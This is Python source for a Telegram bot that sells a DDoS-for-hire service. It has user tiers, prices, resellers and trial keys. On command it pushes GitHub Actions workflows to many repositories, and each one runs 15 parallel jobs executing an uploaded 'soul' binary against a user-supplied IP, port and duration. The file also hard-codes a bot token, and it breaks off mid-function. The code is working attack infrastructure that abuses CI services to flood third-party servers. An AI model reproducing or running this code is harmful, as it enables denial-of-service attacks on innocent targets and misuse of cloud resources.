import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from github import Github, GithubException

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8579474154:AAH16AmOzDPQGlCz14-D10PdZLWnrVTsssY"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
OWNER_IDS = [8101867786]

current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 1000
user_attack_counts = {}

USER_PRICES = {"1": 120, "2": 240, "3": 360, "4": 450, "7": 650}
RESELLER_PRICES = {"1": 150, "2": 250, "3": 300, "4": 400, "7": 550}

# Small caps conversion function
def to_small_caps(text):
    """Convert text to small caps Unicode characters"""
    small_caps_map = {
        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ғ', 'g': 'ɢ', 'h': 'ʜ', 
        'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ',
        'q': 'ǫ', 'r': 'ʀ', 's': 's', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x',
        'y': 'ʏ', 'z': 'ᴢ',
        'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ', 'F': 'ғ', 'G': 'ɢ', 'H': 'ʜ',
        'I': 'ɪ', 'J': 'ᴊ', 'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ', 'P': 'ᴘ',
        'Q': 'ǫ', 'R': 'ʀ', 'S': 's', 'T': 'ᴛ', 'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x',
        'Y': 'ʏ', 'Z': 'ᴢ'
    }
    return ''.join(small_caps_map.get(c, c) for c in text)

def load_json(filename, default):
    try:
        with open(filename, 'r') as f:
            data = json.load(f)
            return data if data else default
    except FileNotFoundError:
        return default

def save_json(filename, data):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)

approved_users = load_json('approved_users.json', {})
owners = load_json('owners.json', {})
admins = load_json('admins.json', {})
resellers = load_json('resellers.json', {})
github_tokens = load_json('github_tokens.json', [])
groups = load_json('groups.json', {})
pending_users = load_json('pending_users.json', [])
trial_keys = load_json('trial_keys.json', {})
user_attack_counts = load_json('user_attack_counts.json', {})

if not owners:
    for owner_id in OWNER_IDS:
        owners[str(owner_id)] = {"username": f"owner_{owner_id}", "added_by": "system", "added_date": time.strftime("%Y-%m-%d %H:%M:%S"), "is_primary": True}
    save_json('owners.json', owners)

MAINTENANCE_MODE = load_json('maintenance.json', {"maintenance": False}).get("maintenance", False)
COOLDOWN_DURATION = load_json('cooldown.json', {"cooldown": 40}).get("cooldown", 40)
MAX_ATTACKS = load_json('max_attacks.json', {"max_attacks": 1000}).get("max_attacks", 1000)

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_primary_owner(user_id):
    owner_data = owners.get(str(user_id), {})
    return owner_data.get('is_primary', False)

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry = approved_users[user_id_str].get('expiry')
        if expiry == "LIFETIME":
            return True
        if time.time() < expiry:
            return True
        del approved_users[user_id_str]
        save_json('approved_users.json', approved_users)
    return False

def can_user_attack(user_id):
    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE

def update_yml_file(token, repo_name, ip, port, time_val):
    yml_content = f"""name: soul Attack
on: [push]
jobs:
  soul:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x soul
    - run: sudo ./soul {ip} {port} {time_val}
"""
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            file_content = repo.get_contents(YML_FILE_PATH)
            repo.update_file(YML_FILE_PATH, f"Update attack {ip}:{port}", yml_content, file_content.sha)
        except:
            repo.create_file(YML_FILE_PATH, f"Create attack {ip}:{port}", yml_content)
        return True
    except Exception as e:
        logger.error(f"Error: {e}")
        return False

def instant_stop_all_jobs(token, repo_name):
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        total_cancelled = 0
        for status in ['queued', 'in_progress', 'pending']:
            try:
                workflows = repo.get_workflow_runs(status=status)
                for workflow in workflows:
                    try:
                        workflow.cancel()
                        total_cancelled += 1
                    except:
                        pass
            except:
                pass
        return total_cancelled
    except:
        return 0

def generate_trial_key(hours):
    key = "TRL-" + "-".join([''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3)])
    expiry = time.time() + (hours * 3600)
    trial_keys[key] = {"created": time.time(), "expiry": expiry, "used": False, "hours": hours}
    save_json('trial_keys.json', trial_keys)
    return key

def redeem_trial_key(key, user_id):
    if key not in trial_keys:
        return False, "Invalid key"
    if trial_keys[key]['used']:
        return False, "Key already used"
    if time.time() > trial_keys[key]['expiry']:
        return False, "Key expired"
    
    hours = trial_keys[key]['hours']
    expiry = time.time() + (hours * 3600)
    approved_users[str(user_id)] = {
        "username": f"trial_{user_id}",
        "added_by": "trial_key",
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": hours/24
    }
    save_json('approved_users.json', approved_users)
    
    trial_keys[key]['used'] = True
    trial_keys[key]['used_by'] = user_id
    trial_keys[key]['used_date'] = time.strftime("%Y-%m-%d %H:%M:%S")
    save_json('trial_keys.json', trial_keys)
    
    return True, f"Trial access granted for {hours} hours"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, cooldown_until
    user = update.effective_user
    user_id = user.id
    first_name = user.first_name
    username = user.username or "user"
    
    chat_type = update.effective_chat.type
    if chat_type in ['group', 'supergroup']:
        chat_id = str(update.effective_chat.id)
        if chat_id not in groups:
            groups[chat_id] = {"name": update.effective_chat.title, "added_date": time.strftime("%Y-%m-%d %H:%M:%S")}
            save_json('groups.json', groups)
    
    if not can_user_attack(user_id):
        user_exists = any(str(u['user_id']) == str(user_id) for u in pending_users)
        if not user_exists:
            pending_users.append({"user_id": user_id, "username": username, "request_date": time.strftime("%Y-%m-%d %H:%M:%S")})
            save_json('pending_users.json', pending_users)
            for owner_id in owners.keys():
                try:
                    msg = f"╔═══════════════════╗\n║  {to_small_caps('NEW ACCESS REQUEST')}  ║\n╚═══════════════════╝\n\n"
                    msg += f"┌─────────────────┐\n"
                    msg += f"│ {to_small_caps('Name')}: {first_name}\n"
                    msg += f"│ {to_small_caps('Username')}: @{username}\n"
                    msg += f"└─────────────────┘\n\n"
                    msg += f"ᴀᴘᴘʀᴏᴠᴇ: /add {user_id} 7"
                    await context.bot.send_message(chat_id=int(owner_id), text=msg)
                except:
                    pass
        
        text = f"╔════════════════════╗\n║  {to_small_caps('ACCESS DENIED')}  ║\n╚════════════════════╝\n\n"
        text += f"⚠️ {to_small_caps('You dont have access to this bot')}\n\n"
        text += f"📨 {to_small_caps('Your request has been sent to admin')}\n"
        text += f"⏳ {to_small_caps('Please wait for approval')}"
        
        keyboard = [[InlineKeyboardButton(f"🔄 {to_small_caps('Refresh')}", callback_data="main_menu")]]
        if update.message:
            await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    remaining = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
    
    if is_owner(user_id):
        role = "👑 ᴏᴡɴᴇʀ"
    elif is_admin(user_id):
        role = "⚡ ᴀᴅᴍɪɴ"
    elif is_reseller(user_id):
        role = "💎 ʀᴇsᴇʟʟᴇʀ"
    else:
        role = "✨ ᴜsᴇʀ"
    
    status_emoji = "🟢" if not MAINTENANCE_MODE else "🔴"
    status_text = to_small_caps("READY") if not MAINTENANCE_MODE else to_small_caps("MAINTENANCE")
    
    text = f"╔════════════════════════╗\n"
    text += f"║ 🔥 {to_small_caps('Remaining attacks')}: {remaining}/{MAX_ATTACKS} ║\n"
    text += f"╚════════════════════════╝\n\n"
    
    text += f"⚡ {to_small_caps('SERVER FREEZE BOT')}\n\n"
    text += f"👋 {to_small_caps('Welcome')}, {first_name}\n\n"
    
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('YOUR INFO')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
    text += f"├ 👤 {to_small_caps('Role')}: {role}\n"
    text += f"├ 🎯 {to_small_caps('Attacks')}: {remaining}/{MAX_ATTACKS}\n"
    text += f"└ 📡 {to_small_caps('Status')}: {status_emoji} {status_text}\n\n"
    
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('QUICK ACTIONS')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛"
    
    keyboard = []
    
    if not MAINTENANCE_MODE:
        keyboard.append([
            InlineKeyboardButton(f"⚡ {to_small_caps('Launch Attack')}", callback_data="attack"),
            InlineKeyboardButton(f"🛑 {to_small_caps('Stop Attack')}", callback_data="stop")
        ])
    
    if is_owner(user_id):
        keyboard.append([
            InlineKeyboardButton(f"👥 {to_small_caps('Manage Users')}", callback_data="manage_users"),
            InlineKeyboardButton(f"🔧 {to_small_caps('Settings')}", callback_data="settings")
        ])
        keyboard.append([
            InlineKeyboardButton(f"📊 {to_small_caps('Statistics')}", callback_data="stats"),
            InlineKeyboardButton(f"🔑 {to_small_caps('Servers')}", callback_data="servers")
        ])
        keyboard.append([
            InlineKeyboardButton(f"🎫 {to_small_caps('Trial Keys')}", callback_data="trial_keys"),
            InlineKeyboardButton(f"👑 {to_small_caps('Admin Panel')}", callback_data="admin_panel")
        ])
    elif is_admin(user_id):
        keyboard.append([
            InlineKeyboardButton(f"👥 {to_small_caps('Manage Users')}", callback_data="manage_users"),
            InlineKeyboardButton(f"📊 {to_small_caps('Statistics')}", callback_data="stats")
        ])
    elif is_reseller(user_id):
        keyboard.append([
            InlineKeyboardButton(f"💰 {to_small_caps('Buy Access')}", callback_data="buy_access"),
            InlineKeyboardButton(f"📊 {to_small_caps('My Sales')}", callback_data="my_sales")
        ])
    else:
        keyboard.append([
            InlineKeyboardButton(f"📱 {to_small_caps('My Access')}", callback_data="my_access"),
            InlineKeyboardButton(f"ℹ️ {to_small_caps('Help')}", callback_data="help")
        ])
    
    keyboard.append([InlineKeyboardButton(f"🔄 {to_small_caps('Refresh')}", callback_data="main_menu")])
    
    if update.message:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, cooldown_until, MAINTENANCE_MODE, COOLDOWN_DURATION, MAX_ATTACKS
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "main_menu":
        await start(update, context)
        return
    
    if not can_user_attack(user_id) and data not in ["main_menu", "help"]:
        text = f"╔════════════════════╗\n║  {to_small_caps('ACCESS DENIED')}  ║\n╚════════════════════╝\n\n"
        text += f"❌ {to_small_caps('You dont have access')}"
        keyboard = [[InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # Attack functionality
    if data == "attack":
        context.user_data['waiting_for'] = 'attack_params'
        text = f"╔════════════════════════╗\n"
        text += f"║  {to_small_caps('LAUNCH ATTACK')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        text += f"📝 {to_small_caps('Enter attack parameters')}:\n\n"
        text += f"┌─────────────────────┐\n"
        text += f"│ {to_small_caps('Format')}: IP PORT TIME │\n"
        text += f"└─────────────────────┘\n\n"
        text += f"📌 {to_small_caps('Example')}: 1.1.1.1 80 300\n\n"
        text += f"⚠️ {to_small_caps('Time in seconds')}\n"
        text += f"⚠️ {to_small_caps('Max time')}: 600s"
        keyboard = [[InlineKeyboardButton(f"❌ {to_small_caps('Cancel')}", callback_data="main_menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # Stop attack
    if data == "stop":
        if not current_attack:
            text = f"╔═══════════════════╗\n"
            text += f"║  {to_small_caps('NO ATTACK')}  ║\n"
            text += f"╚═══════════════════╝\n\n"
            text += f"ℹ️ {to_small_caps('No attack is running')}"
            keyboard = [[InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]]
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
            return
        
        progress = await query.edit_message_text(f"⏳ {to_small_caps('Stopping attack')}...")
        
        total = 0
        for token_data in github_tokens:
            stopped = instant_stop_all_jobs(token_data['token'], token_data['repo'])
            total += stopped
        
        current_attack = None
        
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('ATTACK STOPPED')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"✅ {to_small_caps('Successfully stopped')}\n"
        text += f"📊 {to_small_caps('Jobs cancelled')}: {total}"
        keyboard = [[InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]]
        await progress.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # Statistics
    if data == "stats":
        total_users = len(approved_users)
        total_admins = len(admins)
        total_resellers = len(resellers)
        total_servers = len(github_tokens)
        total_groups = len(groups)
        pending = len(pending_users)
        
        text = f"╔════════════════════════╗\n"
        text += f"║  {to_small_caps('SYSTEM STATISTICS')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        
        text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {to_small_caps('USER STATS')}  ┃\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
        text += f"├ 👥 {to_small_caps('Total Users')}: {total_users}\n"
        text += f"├ ⚡ {to_small_caps('Admins')}: {total_admins}\n"
        text += f"├ 💎 {to_small_caps('Resellers')}: {total_resellers}\n"
        text += f"└ ⏳ {to_small_caps('Pending')}: {pending}\n\n"
        
        text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {to_small_caps('SYSTEM STATS')}  ┃\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
        text += f"├ 🔑 {to_small_caps('Servers')}: {total_servers}\n"
        text += f"├ 📱 {to_small_caps('Groups')}: {total_groups}\n"
        text += f"├ ⏱️ {to_small_caps('Cooldown')}: {COOLDOWN_DURATION}s\n"
        text += f"└ 🎯 {to_small_caps('Max Attacks')}: {MAX_ATTACKS}"
        
        keyboard = [[InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # Settings (Owner only)
    if data == "settings":
        if not is_owner(user_id):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('SYSTEM SETTINGS')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        
        text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {to_small_caps('CURRENT CONFIG')}  ┃\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
        text += f"├ 🔧 {to_small_caps('Maintenance')}: {'🔴 ON' if MAINTENANCE_MODE else '🟢 OFF'}\n"
        text += f"├ ⏱️ {to_small_caps('Cooldown')}: {COOLDOWN_DURATION}s\n"
        text += f"└ 🎯 {to_small_caps('Max Attacks')}: {MAX_ATTACKS}"
        
        keyboard = [
            [InlineKeyboardButton(f"🔧 {to_small_caps('Toggle Maintenance')}", callback_data="toggle_maintenance")],
            [InlineKeyboardButton(f"⏱️ {to_small_caps('Change Cooldown')}", callback_data="change_cooldown")],
            [InlineKeyboardButton(f"🎯 {to_small_caps('Change Max Attacks')}", callback_data="change_max_attacks")],
            [InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # Toggle Maintenance
    if data == "toggle_maintenance":
        if not is_owner(user_id):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        
        MAINTENANCE_MODE = not MAINTENANCE_MODE
        save_json('maintenance.json', {"maintenance": MAINTENANCE_MODE})
        
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('MAINTENANCE MODE')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"✅ {to_small_caps('Status')}: {'🔴 ENABLED' if MAINTENANCE_MODE else '🟢 DISABLED'}"
        
        keyboard = [[InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # Manage Users
    if data == "manage_users":
        if not (is_owner(user_id) or is_admin(user_id)):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('USER MANAGEMENT')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"📊 {to_small_caps('Total Users')}: {len(approved_users)}\n"
        text += f"⏳ {to_small_caps('Pending')}: {len(pending_users)}"
        
        keyboard = [
            [InlineKeyboardButton(f"✅ {to_small_caps('Approve Pending')}", callback_data="approve_pending")],
            [InlineKeyboardButton(f"👥 {to_small_caps('View All Users')}", callback_data="view_users")],
            [InlineKeyboardButton(f"❌ {to_small_caps('Remove User')}", callback_data="remove_user")],
            [InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # My Access
    if data == "my_access":
        user_data = approved_users.get(str(user_id), {})
        expiry = user_data.get('expiry', 0)
        
        if expiry == "LIFETIME":
            expiry_text = to_small_caps("LIFETIME")
        else:
            days_left = int((expiry - time.time()) / 86400)
            hours_left = int(((expiry - time.time()) % 86400) / 3600)
            expiry_text = f"{days_left}ᴅ {hours_left}ʜ"
        
        remaining = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
        
        if is_owner(user_id):
            role = "👑 ᴏᴡɴᴇʀ"
        elif is_admin(user_id):
            role = "⚡ ᴀᴅᴍɪɴ"
        elif is_reseller(user_id):
            role = "💎 ʀᴇsᴇʟʟᴇʀ"
        else:
            role = "✨ ᴜsᴇʀ"
        
        text = f"╔════════════════════════╗\n"
        text += f"║  {to_small_caps('YOUR ACCESS INFO')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        
        text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {to_small_caps('ACCOUNT DETAILS')}  ┃\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
        text += f"├ 👤 {to_small_caps('Role')}: {role}\n"
        text += f"├ 👤 {to_small_caps('Name')}: {query.from_user.first_name}\n"
        text += f"├ 📅 {to_small_caps('Expiry')}: {expiry_text}\n"
        text += f"├ 🎯 {to_small_caps('Attacks')}: {remaining}/{MAX_ATTACKS}\n"
        text += f"└ ✅ {to_small_caps('Status')}: {'🟢 ACTIVE' if can_user_attack(user_id) else '🔴 INACTIVE'}"
        
        keyboard = [[InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # Help
    if data == "help":
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('HELP & COMMANDS')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        
        text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {to_small_caps('BASIC COMMANDS')}  ┃\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
        text += f"/start - {to_small_caps('Main menu')}\n"
        text += f"/id - {to_small_caps('Get your ID')}\n"
        text += f"/myaccess - {to_small_caps('Check access')}\n"
        text += f"/help - {to_small_caps('Show help')}\n"
        text += f"/redeem <key> - {to_small_caps('Redeem trial')}\n\n"
        
        if is_owner(user_id) or is_admin(user_id):
            text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
            text += f"┃  {to_small_caps('ADMIN COMMANDS')}  ┃\n"
            text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
            text += f"/add <id> <days> - {to_small_caps('Add user')}\n"
            text += f"/remove <id> - {to_small_caps('Remove user')}"
        
        keyboard = [[InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # Servers management
    if data == "servers":
        if not is_owner(user_id):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('SERVER MANAGEMENT')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"🔑 {to_small_caps('Total Servers')}: {len(github_tokens)}\n\n"
        
        if github_tokens:
            text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
            text += f"┃  {to_small_caps('SERVER LIST')}  ┃\n"
            text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
            for i, token_data in enumerate(github_tokens[:5], 1):
                text += f"{i}. {token_data['repo']}\n"
            if len(github_tokens) > 5:
                text += f"\n...{to_small_caps('and')} {len(github_tokens) - 5} {to_small_caps('more')}"
        
        keyboard = [
            [InlineKeyboardButton(f"➕ {to_small_caps('Add Server')}", callback_data="add_server")],
            [InlineKeyboardButton(f"❌ {to_small_caps('Remove Server')}", callback_data="remove_server")],
            [InlineKeyboardButton(f"📤 {to_small_caps('Upload Binary')}", callback_data="upload_binary")],
            [InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # Trial Keys
    if data == "trial_keys":
        if not is_owner(user_id):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        
        active_keys = sum(1 for k in trial_keys.values() if not k['used'] and time.time() < k['expiry'])
        used_keys = sum(1 for k in trial_keys.values() if k['used'])
        
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('TRIAL KEY SYSTEM')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        
        text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {to_small_caps('KEY STATISTICS')}  ┃\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
        text += f"├ ✅ {to_small_caps('Active Keys')}: {active_keys}\n"
        text += f"├ ✔️ {to_small_caps('Used Keys')}: {used_keys}\n"
        text += f"└ 📊 {to_small_caps('Total Keys')}: {len(trial_keys)}"
        
        keyboard = [
            [InlineKeyboardButton(f"➕ {to_small_caps('Generate Key')}", callback_data="gen_trial")],
            [InlineKeyboardButton(f"📋 {to_small_caps('View Keys')}", callback_data="view_trial_keys")],
            [InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    # Admin Panel
    if data == "admin_panel":
        if not is_owner(user_id):
            await query.answer(to_small_caps("Access denied"), show_alert=True)
            return
        
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('ADMIN CONTROL PANEL')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        
        text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {to_small_caps('ROLE MANAGEMENT')}  ┃\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
        text += f"├ 👑 {to_small_caps('Owners')}: {len(owners)}\n"
        text += f"├ ⚡ {to_small_caps('Admins')}: {len(admins)}\n"
        text += f"└ 💎 {to_small_caps('Resellers')}: {len(resellers)}"
        
        keyboard = [
            [InlineKeyboardButton(f"👑 {to_small_caps('Manage Owners')}", callback_data="manage_owners")],
            [InlineKeyboardButton(f"⚡ {to_small_caps('Manage Admins')}", callback_data="manage_admins")],
            [InlineKeyboardButton(f"💎 {to_small_caps('Manage Resellers')}", callback_data="manage_resellers")],
            [InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, cooldown_until
    user_id = update.effective_user.id
    text = update.message.text
    
    if not can_user_attack(user_id):
        return
    
    waiting_for = context.user_data.get('waiting_for')
    
    if waiting_for == 'attack_params':
        parts = text.split()
        if len(parts) != 3:
            await update.message.reply_text(f"❌ {to_small_caps('Invalid format')}\n\n{to_small_caps('Use')}: IP PORT TIME")
            return
        
        try:
            ip = parts[0]
            port = int(parts[1])
            duration = int(parts[2])
            
            if duration > 600:
                await update.message.reply_text(f"❌ {to_small_caps('Max time is 600 seconds')}")
                return
            
            if port < 1 or port > 65535:
                await update.message.reply_text(f"❌ {to_small_caps('Invalid port')}")
                return
        except:
            await update.message.reply_text(f"❌ {to_small_caps('Invalid parameters')}")
            return
        
        context.user_data.clear()
        
        if current_attack:
            await update.message.reply_text(f"⚠️ {to_small_caps('Attack already running')}\n{to_small_caps('Use')} /start {to_small_caps('to stop it first')}")
            return
        
        if time.time() < cooldown_until:
            remaining = int(cooldown_until - time.time())
            await update.message.reply_text(f"⏳ {to_small_caps('Cooldown active')}\n{to_small_caps('Wait')}: {remaining}s")
            return
        
        user_attacks = user_attack_counts.get(str(user_id), 0)
        if user_attacks >= MAX_ATTACKS and not is_owner(user_id):
            await update.message.reply_text(f"❌ {to_small_caps('Attack limit reached')}\n{to_small_caps('Max')}: {MAX_ATTACKS}")
            return
        
        if not github_tokens:
            await update.message.reply_text(f"❌ {to_small_caps('No servers available')}")
            return
        
        progress = await update.message.reply_text(f"⚡ {to_small_caps('Initializing attack')}...")
        
        with attack_lock:
            current_attack = {"ip": ip, "port": port, "time": duration, "user": user_id}
            cooldown_until = time.time() + COOLDOWN_DURATION
            
            user_attack_counts[str(user_id)] = user_attack_counts.get(str(user_id), 0) + 1
            save_json('user_attack_counts.json', user_attack_counts)
        
        success = 0
        for token_data in github_tokens:
            if update_yml_file(token_data['token'], token_data['repo'], ip, port, duration):
                success += 1
        
        text = f"╔════════════════════════╗\n"
        text += f"║  {to_small_caps('ATTACK LAUNCHED')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        
        text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {to_small_caps('TARGET INFO')}  ┃\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
        text += f"├ 🎯 {to_small_caps('Target')}: {ip}:{port}\n"
        text += f"├ ⏱️ {to_small_caps('Duration')}: {duration}s\n"
        text += f"├ 🔑 {to_small_caps('Servers')}: {success}/{len(github_tokens)}\n"
        text += f"└ ⏳ {to_small_caps('Cooldown')}: {COOLDOWN_DURATION}s\n\n"
        text += f"✅ {to_small_caps('Attack in progress')}"
        
        await progress.edit_text(text)
        return

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return
    
    if context.user_data.get('waiting_for') != 'binary':
        return
    
    context.user_data.clear()
    
    if not update.message.document:
        await update.message.reply_text(f"❌ {to_small_caps('Please send a file')}")
        return
    
    progress = await update.message.reply_text(f"📥 {to_small_caps('Downloading')}...")
    
    try:
        file = await update.message.document.get_file()
        file_path = f"temp_binary_{user_id}.bin"
        await file.download_to_drive(file_path)
        
        with open(file_path, 'rb') as f:
            binary_content = f.read()
        
        file_size = len(binary_content)
        await progress.edit_text(f"📊 {to_small_caps('Downloaded')}: {file_size} bytes\n📤 {to_small_caps('Uploading')}...")
        
        success = 0
        fail = 0
        results = []
        
        def upload_to_repo(token_data):
            try:
                g = Github(token_data['token'])
                repo = g.get_repo(token_data['repo'])
                try:
                    existing = repo.get_contents(BINARY_FILE_NAME)
                    repo.update_file(BINARY_FILE_NAME, "Update binary", binary_content, existing.sha, branch="main")
                    results.append(True)
                except:
                    repo.create_file(BINARY_FILE_NAME, "Upload binary", binary_content, branch="main")
                    results.append(True)
            except:
                results.append(False)
        
        threads = []
        for token_data in github_tokens:
            thread = threading.Thread(target=upload_to_repo, args=(token_data,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        success = sum(results)
        fail = len(results) - success
        
        os.remove(file_path)
        
        text = f"╔════════════════════════╗\n"
        text += f"║  {to_small_caps('UPLOAD COMPLETE')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        
        text += f"├ ✅ {to_small_caps('Success')}: {success}\n"
        text += f"├ ❌ {to_small_caps('Failed')}: {fail}\n"
        text += f"├ 📊 {to_small_caps('Total')}: {len(github_tokens)}\n"
        text += f"└ 📦 {to_small_caps('Size')}: {file_size} bytes"
        
        await progress.edit_text(text)
    except Exception as e:
